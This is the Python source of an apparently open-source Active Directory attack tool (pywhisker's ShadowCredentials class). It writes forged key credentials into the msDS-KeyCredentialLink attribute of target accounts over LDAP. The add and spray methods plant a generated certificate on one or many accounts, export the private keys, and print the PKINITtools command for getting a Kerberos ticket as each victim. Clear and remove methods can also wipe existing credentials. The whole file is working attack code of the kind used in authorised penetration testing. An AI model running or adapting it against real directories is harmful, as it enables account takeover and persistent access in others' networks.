import json
import random
import string
import os

import ldap3
import ldapdomaindump
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.formatters.formatters import format_sid

from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime

from pywhisker.Logger import Logger
logger = Logger()

class ShadowCredentials(object):
    def __init__(self, ldap_server, ldap_session, target_samname, args, target_domain=None):
        super(ShadowCredentials, self).__init__()
        self.ldap_server = ldap_server
        self.ldap_session = ldap_session
        self.delegate_from = None
        self.target_samname = target_samname
        self.target_dn = None
        self.target_domain_dn = ','.join(f'DC={component}' for component in target_domain.split('.')) if target_domain is not None else None
        self.args = args
        logger.debug('Initializing domainDumper()')
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = None
        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf, root=self.target_domain_dn)


    def info(self, device_id):
        logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logger.error('Could not query target user properties')
            return
        try:
            device_id_in_current_values = False
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                if keyCredential.DeviceId.toFormatD() == device_id:
                    logger.success("Found device Id")
                    keyCredential.show()
                    device_id_in_current_values = True
            if not device_id_in_current_values:
                logger.warning("No value with the provided DeviceID was found for the target object")
        except IndexError:
            logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def list(self):
        logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logger.error('Could not query target user properties')
            return
        try:
            if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
                logger.info('Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute')
            else:
                logger.info("Listing devices for %s" % self.target_samname)
                for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                    keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                    logger.info("DeviceID: %s | Creation Time (UTC): %s" % (keyCredential.DeviceId.toFormatD(), keyCredential.CreationTime))
        except IndexError:
            logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return

    def add(self, password, path, export_type, domain, args, target_domain):
        logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logger.info("Target user found: %s" % self.target_dn)
        logger.info("Generating certificate")
        certificate = X509Certificate2(subject=self.target_samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
        logger.info("Certificate generated")
        logger.info("Generating KeyCredential")
        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
        logger.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
        if args.verbosity == 2:
            keyCredential.fromDNWithBinary(keyCredential.toDNWithBinary()).show()
        logger.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logger.error('Could not query target user properties')
            return
        try:
            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
            logger.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
            self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
            if self.ldap_session.result['result'] == 0:
                logger.success("Updated the msDS-KeyCredentialLink attribute of the target object")
                if path is None:
                    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                    logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: %s" % path)
                if export_type == "PEM":
                    certificate.ExportPEM(path_to_files=path)
                    logger.success("Saved PEM certificate at path: %s" % path + "_cert.pem")
                    logger.success("Saved PEM private key at path: %s" % path + "_priv.pem")
                    logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                    logger.verbose("Run the following command to obtain a TGT")
                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, target_domain if target_domain is not None else domain, self.target_samname, path))
                elif export_type == "PFX":
                    if password is None:
                        password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                        logger.verbose("No pass was provided. The certificate will be stored with the password: %s" % password)
                    certificate.ExportPFX(password=password, path_to_file=path)
                    logger.success("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                    logger.info("Must be used with password: %s" % password)
                    logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                    logger.verbose("Run the following command to obtain a TGT")
                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, target_domain if target_domain is not None else domain, self.target_samname, path))
            else:
                if self.ldap_session.result['result'] == 50:
                    logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                else:
                    logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
        except IndexError:
            logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def spray(self, password, path, export_type, domain, target_domain):
        logger.info("Performing attempts to add msDS-KeyCredentialLink for a list of users")
        if type(self.target_samname) == str:
            self.target_samname = [self.target_samname]
        if path is None:
            path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
            logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: <USERNAME>_%s" % path)
        if export_type == "PFX" and password is None:
            password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
            logger.verbose("No pass was provided. The certificate will be stored with the password: %s" % password)
        targets_owned = []
        for samname in self.target_samname:
            result = self.get_dn_sid_from_samname(samname)
            if not result:
                #logger.error(f'Target account does not exist! (wrong domain?): {samname}')
                continue
            else:
                self.target_dn = result[0]
            certificate = X509Certificate2(subject=samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
            keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=self.target_dn, currentTime=DateTime())
            self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
            results = None
            for entry in self.ldap_session.response:
                if entry['type'] != 'searchResEntry':
                    continue
                results = entry
            if not results:
                #logger.error(f'Could not query target user properties: {samname}')
                continue
            try:
                new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                if self.ldap_session.result['result'] == 0:
                    targets_owned.append(samname)
                    logger.success(f"Updated the msDS-KeyCredentialLink attribute of the target object: {samname}")
                    if export_type == "PEM":
                        certificate.ExportPEM(path_to_files=f'{samname}_{path}')
                        logger.info(f"Saved PEM certificate for {samname} at path {samname + '_' + path + '_cert.pem'}, PEM private key at path {samname + '_' + path + '_priv.pem'}")
                    elif export_type == "PFX":
                        certificate.ExportPFX(password=password, path_to_file=f'{samname}_{path}')
                        logger.info(f"Saved PFX (#PKCS12) certificate & key for {samname} at path {samname + '_' + path + '.pfx'}, the password is {password}")
            except IndexError:
                logger.info('Attribute msDS-KeyCredentialLink does not exist')
        if not targets_owned:
            logger.warning("No user object was modified during the spray")
        else:
            logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
            logger.verbose("Run the following command to obtain a TGT")
            if export_type == "PEM":
                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem <USERNAME>_%s_cert.pem -key-pem <USERNAME>_%s_priv.pem %s/<USERNAME> <USERNAME>.ccache" % (path, path, target_domain if target_domain is not None else domain))
            elif export_type == "PFX":
                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx <USERNAME>_%s.pfx -pfx-pass %s %s/<USERNAME> <USERNAME>.ccache" % (path, password, target_domain if target_domain is not None else domain))


    def remove(self, device_id):
        logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logger.error('Could not query target user properties')
            return
        try:
            new_values = []
            device_id_in_current_values = False
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                if keyCredential.DeviceId.toFormatD() == device_id:
                    logger.info("Found value to remove")
                    device_id_in_current_values = True
                else:
                    new_values.append(dn_binary_value)
            if device_id_in_current_values:
                logger.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                if self.ldap_session.result['result'] == 0:
                    logger.success("Updated the msDS-KeyCredentialLink attribute of the target object")
                else:
                    if self.ldap_session.result['result'] == 50:
                        logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                    elif self.ldap_session.result['result'] == 19:
                        logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                    else:
                        logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
            else:
                logger.error("No value with the provided DeviceID was found for the target object")
        except IndexError:
            logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def clear(self):
        logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logger.error('Could not query target user properties')
            return
        try:
            if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
                logger.info('Attribute msDS-KeyCredentialLink is empty')
            else:
                logger.info("Clearing the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
                if self.ldap_session.result['result'] == 0:
                    logger.success('msDS-KeyCredentialLink cleared successfully!')
                else:
                    if self.ldap_session.result['result'] == 50:
                        logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                    elif self.ldap_session.result['result'] == 19:
                        logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                    else:
                        logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
                return
        except IndexError:
            logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def importFromJSON(self, filename):
        logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logger.error('Could not query target user properties')
            return
        try:
            if os.path.exists(filename):
                keyCredentials = []
                with open(filename, "r") as f:
                    data = json.load(f)
                    for kcjson in data["keyCredentials"]:
                        keyCredentials.append(KeyCredential.fromDict(kcjson).toDNWithBinary().toString())
            logger.info("Modifying the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
            self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, keyCredentials]})
            if self.ldap_session.result['result'] == 0:
                logger.success('msDS-KeyCredentialLink modified successfully!')
            else:
                if self.ldap_session.result['result'] == 50:
                    logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
                elif self.ldap_session.result['result'] == 19:
                    logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
                else:
                    logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
            return
        except IndexError:
            logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def exportToJSON(self, filename):
        logger.info("Searching for the target account")
        result = self.get_dn_sid_from_samname(self.target_samname)
        if not result:
            logger.error('Target account does not exist! (wrong domain?)')
            return
        else:
            self.target_dn = result[0]
            logger.info("Target user found: %s" % self.target_dn)
        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
        results = None
        for entry in self.ldap_session.response:
            if entry['type'] != 'searchResEntry':
                continue
            results = entry
        if not results:
            logger.error('Could not query target user properties')
            return
        try:
            if filename is None:
                filename = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8)) + ".json"
                logger.verbose("No filename was provided. The keyCredential(s) will be stored with the filename: %s" % filename)
            if len(os.path.dirname(filename)) != 0:
                if not os.path.exists(os.path.dirname(filename)):
                    os.makedirs(os.path.dirname(filename), exist_ok=True)
            keyCredentialsJSON = {"keyCredentials":[]}
            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                keyCredentialsJSON["keyCredentials"].append(keyCredential.toDict())
            with open(filename, "w") as f:
                f.write(json.dumps(keyCredentialsJSON, indent=4))
            logger.success("Saved JSON dump at path: %s" % filename)
        except IndexError:
            logger.info('Attribute msDS-KeyCredentialLink does not exist')
        return


    def get_dn_sid_from_samname(self, samname):
        self.ldap_session.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            sid = format_sid(self.ldap_session.entries[0]['objectSid'].raw_values[0])
            return dn, sid
        except IndexError:
            logger.error('User not found in LDAP: %s' % samname)
            return False

    def get_sid_info(self, sid):
        self.ldap_session.search(self.domain_dumper.root, '(objectSid=%s)' % escape_filter_chars(sid), attributes=['samaccountname'])
        try:
            dn = self.ldap_session.entries[0].entry_dn
            samname = self.ldap_session.entries[0]['samaccountname']
            return dn, samname
        except IndexError:
            logger.error('SID not found in LDAP: %s' % sid)
            return False